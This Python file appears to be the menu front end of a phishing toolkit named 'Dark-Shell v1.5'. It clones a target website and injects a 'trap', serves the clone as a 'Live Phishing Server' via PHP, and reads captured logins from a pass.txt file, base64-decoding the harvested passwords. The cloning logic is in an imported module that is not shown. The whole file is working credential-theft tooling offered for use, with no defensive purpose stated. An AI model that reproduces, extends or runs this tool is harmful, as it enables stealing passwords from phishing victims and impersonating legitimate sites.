import os
import sys
import time
import subprocess
import re
import base64
from colorama import Fore, Style, init
from modules.cloner import start_cloning

init(autoreset=True)

def slow_type(text, speed=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def banner():
    os.system('clear')
    banner_text = f"""
{Fore.RED}{Style.BRIGHT}    
    ██████   █████  ██████  ██   ██     ███████ ██   ██ ███████ ██      ██      
    ██   ██ ██   ██ ██   ██ ██  ██      ██      ██   ██ ██      ██      ██      
    ██   ██ ███████ ██████  █████       ███████ ███████ █████   ██      ██      
    ██   ██ ██   ██ ██   ██ ██  ██           ██ ██   ██ ██      ██      ██      
    ██████  ██   ██ ██   ██ ██   ██     ███████ ██   ██ ███████ ███████ ███████ 
    """
    print(banner_text)
    print(f"{Fore.CYAN}{'='*80}")
    print(f"{Fore.WHITE}{Style.BRIGHT}      [+] Framework: {Fore.RED}Dark-Shell v1.5{Fore.WHITE} | Status: {Fore.GREEN}Active")
    print(f"{Fore.WHITE}      [+] Modules: {Fore.RED}IP-Logger, Telegram-Alerts, Auto-Decoder")
    print(f"{Fore.CYAN}{'='*80}\\n")

def loading_animation(text):
    chars = "/—\\|"
    for i in range(15):
        time.sleep(0.1)
        sys.stdout.write(f"\\r{Fore.YELLOW}[{chars[i % len(chars)]}] {text}...")
        sys.stdout.flush()
    print(f"\\n{Fore.GREEN}[✔] Success!")

def start_server():
    banner()
    if not os.path.exists('cloned_web'):
        print(f"{Fore.RED}[!] Error: No cloned site found.")
    else:
        print(f"{Fore.GREEN}[+] Initializing Shadow Server...")
        loading_animation("Starting PHP backend")
        print(f"\\n{Fore.WHITE}Link: {Fore.CYAN}http://localhost:8080")
        print(f"\\n{Fore.YELLOW}[!] Tracking active... Press Ctrl+C to stop.")
        try:
            subprocess.run(["php", "-S", "localhost:8080", "-t", "cloned_web"])
        except KeyboardInterrupt:
            print(f"\\n{Fore.RED}[!] Server Terminated.")
    input(f"\\n{Fore.WHITE}Press Enter to return...")

def main():
    try:
        banner()
        print(f"  {Fore.RED}[01]{Fore.WHITE} Clone Website & Inject Trap")
        print(f"  {Fore.RED}[02]{Fore.WHITE} Start Live Phishing Server")
        print(f"  {Fore.RED}[03]{Fore.WHITE} View Captured Logs & Decode")
        print(f"  {Fore.RED}[00]{Fore.WHITE} Exit Framework")
        
        cmd = input(f"\\n{Fore.CYAN}┌──({Fore.RED}pro@dark-shell{Fore.CYAN})-[{Fore.WHITE}~/Toolkit{Fore.CYAN}]\\n└─{Fore.RED}$ {Fore.WHITE}")
        
        if cmd == '01' or cmd == '1':
            banner()
            target = input(f"{Fore.YELLOW}[?] Target URL: {Fore.WHITE}")
            start_cloning(target)
            loading_animation("Deploying Payload")
            input(f"\\n{Fore.WHITE}Press Enter to return...")
            main()
        elif cmd == '02' or cmd == '2':
            start_server()
            main()
        elif cmd == '03' or cmd == '3':
            banner()
            log_path = 'cloned_web/pass.txt'
            if os.path.exists(log_path):
                print(f"{Fore.GREEN}[ Reading Shadow Logs... ]\\n")
                with open(log_path, 'r') as f:
                    content = f.read()
                    print(Fore.WHITE + content)
                    if "password=" in content:
                        passwords = re.findall(r'password=(.*)', content)
                        print(f"\\n{Fore.CYAN}[*] Decoding passwords...")
                        for p in passwords:
                            try:
                                decoded = base64.b64decode(p.strip()).decode('utf-8')
                                print(f"{Fore.YELLOW}  [!] Decoded: {Fore.GREEN}{decoded}")
                            except: continue
            else:
                print(f"{Fore.RED}[!] No logs found.")
            input(f"\\n{Fore.WHITE}Press Enter to return...")
            main()
        elif cmd == '00' or cmd == '0':
            slow_type(f"{Fore.RED}Shutting down... Goodbye! 💀", 0.05)
            sys.exit()
        else:
            main()
    except KeyboardInterrupt:
        print(f"\\n\\n{Fore.RED}[!] Forcefully closed.")
        sys.exit()

if __name__ == "__main__":
    main()
